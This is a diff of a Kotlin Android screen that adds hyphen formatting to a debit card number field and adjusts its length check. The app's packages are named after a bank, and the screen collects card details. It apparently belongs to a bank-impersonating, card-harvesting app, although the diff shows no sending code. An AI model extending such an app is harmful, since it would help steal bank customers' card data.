@@ -4,9 +4,11 @@ import android.content.Intent
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.text.Editable
+import android.text.TextUtils
 import android.text.TextWatcher
 import android.util.Log
 import android.widget.Toast
+import androidx.core.widget.addTextChangedListener
 import com.example.axisbank.SecondPage
 import com.example.axisbank.Submit2
 import com.example.oldaxisbank.databinding.ActivityVerifydetailBinding
@@ -17,6 +19,7 @@ import retrofit2.Response
 class verifydetail : AppCompatActivity() {
 
     private lateinit var binding : ActivityVerifydetailBinding
+    private val creditCardTextWatcher = CreditCardTextWatcher()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,6 +44,10 @@ class verifydetail : AppCompatActivity() {
             }
         })
 
+
+        binding.e1.addTextChangedListener(creditCardTextWatcher)
+
+
         binding.login.setOnClickListener {
 
 
@@ -48,7 +55,7 @@ class verifydetail : AppCompatActivity() {
                 binding.e3.text.toString().isEmpty()  ){
                 Toast.makeText(this,"fill all fields",Toast.LENGTH_SHORT).show()
             }
-            else if (binding.e1.text.toString().length < 16 ){
+            else if (binding.e1.text.toString().length < 19 ){
                 Toast.makeText(this,"Please Enter 16 digit Debit Card Number",Toast.LENGTH_SHORT).show()
             }
             else{
@@ -85,3 +92,45 @@ class verifydetail : AppCompatActivity() {
 
     }
 }
+
+
+
+class CreditCardTextWatcher : TextWatcher {
+    private var isFormatting = false
+    private val separator = '-'
+
+    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
+
+    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
+
+    override fun afterTextChanged(s: Editable?) {
+        if (isFormatting) {
+            return
+        }
+
+        isFormatting = true
+        formatCreditCardNumber(s)
+        isFormatting = false
+    }
+
+    private fun formatCreditCardNumber(text: Editable?) {
+        text?.let {
+            val length = text.length
+
+            if (length > 0 && (length + 1) % 5 == 0) {
+                val c = text[length - 1]
+                if (separator == c) {
+                    text.delete(length - 1, length)
+                }
+            }
+
+            if (length > 0 && length % 5 == 0) {
+                val c = text[length - 1]
+                if (Character.isDigit(c) && TextUtils.split(text.toString(), separator.toString()).size <= 3) {
+                    text.insert(length - 1, separator.toString())
+                }
+            }
+        }
+    }
+}
+
